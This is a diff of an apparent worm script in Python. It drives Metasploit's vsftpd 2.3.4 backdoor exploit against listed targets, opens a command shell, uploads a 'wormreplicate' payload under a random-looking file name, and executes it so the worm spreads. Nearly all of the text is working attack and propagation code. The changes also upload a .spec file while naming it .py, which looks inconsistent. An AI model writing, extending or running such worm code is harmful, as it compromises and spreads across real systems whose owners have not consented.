@@ -2,6 +2,8 @@
 from nclib import TCPServer
 import pexpect
 import sys
+import random
+import string as strings
 
 def listener():
 
@@ -19,7 +21,6 @@ def listener():
 		return target_list
 
 def generate(target):
-	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
 	
 	process = pexpect.spawn(["msfconsole"])
 	process.logfile = sys.stdout.buffer
@@ -30,12 +31,15 @@ def generate(target):
 	process.sendline("run")
 	process.expect("Command shell session 1 opened")
 
+	#letters = strings.ascii_lowercase()
+	randname = 'jkhdsasdasdffdgw.py'
 
-	process.sendline("upload /home/peyton/Documents/Worm/wormreplicate.py /wormreplicate11.py")
+
+	process.sendline("upload /home/peyton/Documents/Worm/wormreplicate.spec "+randname)
 	process.expect("upload finished")
 
 	process.sendline("shell")
-	process.sendline("cd / && chmod +x wormreplicate11.py && ./wormreplicate11.py")
+	process.sendline("cd / && chmod +x "+randname+" && ./"+randname)
 	process.expect("success")
 
 	
